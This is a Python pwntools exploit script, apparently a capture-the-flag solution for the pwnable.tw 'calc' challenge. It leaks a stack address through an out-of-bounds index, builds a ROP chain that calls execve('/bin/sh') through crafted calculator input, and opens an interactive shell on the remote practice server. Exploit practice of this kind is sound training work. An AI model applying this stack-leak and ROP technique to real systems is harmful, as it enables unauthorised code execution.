from pwn import *

binsh_2 = 1845554944  # 0x2f,0x62,0x69,0x6e
binsh_1 = 6845231 # 0x2f,0x73,0x68


# 0x080701d0 : pop edx ; pop ecx ; pop ebx ; ret

pop_eax_ret = 0x0805c34b

pop_ebx_ret = 0x080701d0

syscall = 0x08070880

# io = process("./calc")
io = remote("chall.pwnable.tw", 10100)


io.recvuntil("=== Welcome to SECPROG calculator ===\n")

io.sendline("+360")

stack_addr = 0xffffffff + 1 + int(io.recvuntil('\n', drop = True),10) - 1468

log.info("stack 0x%x", stack_addr)

payload = p32(pop_eax_ret)

io.sendline("+361+77490")   # eax  
io.sendline("+362-77479")   # 11
io.sendline("+363+134599465")   # edx, ecx, ebx
io.sendline("+364-134599465")   # 0 
io.sendline("+365-134599465")   # 0

tmp = stack_addr - 0xffffffff - 1 
val_1 = 134599465-tmp
log.info("val_1 " +  str(val_1))

io.sendline("+366-"+str(val_1))   # /bin/sh

val_2 = val_1 - syscall 

io.sendline("+367-" + str(val_2)) # syscall

io.sendline(str(binsh_2) + '+' + str(binsh_1))

# 134599465 -> -6379524

io.send("\n")

io.interactive()